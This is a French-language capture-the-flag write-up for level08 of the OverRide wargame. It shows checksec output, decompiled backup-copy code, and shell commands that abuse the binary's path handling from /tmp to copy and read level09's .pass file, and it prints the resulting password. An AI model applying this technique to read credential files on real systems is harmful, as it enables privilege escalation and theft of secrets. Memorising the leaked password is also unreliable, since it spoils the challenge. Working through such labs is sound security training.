@@ -1,0 +1,44 @@
+checksec --file level08
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   level08
+
+on doit  ouvire un fichier  de dans le dossier backups
+
+    int64_t file;
+    __builtin_strncpy(&file, "./backups/", 0xb);
+    int64_t i = -1;
+    int64_t* rdi_2 = &file;
+
+    while (i)
+    {
+        bool cond:0_1 = 0 != *rdi_2;
+        rdi_2 += 1;
+        i -= 1;
+        
+        if (!cond:0_1)
+            break;
+    }
+
+    strncat(&file, argv[1], 0x63 - (~i - 1));
+    int32_t fd = open(&file, 0xc1, 0x1b0);
+
+    if (fd < 0)
+    {
+        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
+        exit(1);
+        /* no return */
+    }
+
+souci  on ne peut  rien manipuler dans le repoitoire  courant  va  utiliser tmp 
+on ce dit  qui  est  possible  qui fait  un recher dans le repertoire qui son a l'interieur  du dossier  backups 
+donc si on tester  de /home/users/level09
+
+level08@OverRide:/tmp$ mkdir -p 'backups//home/users/level09'
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+level08@OverRide:/tmp$ su level09
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
+level09@OverRide:~$
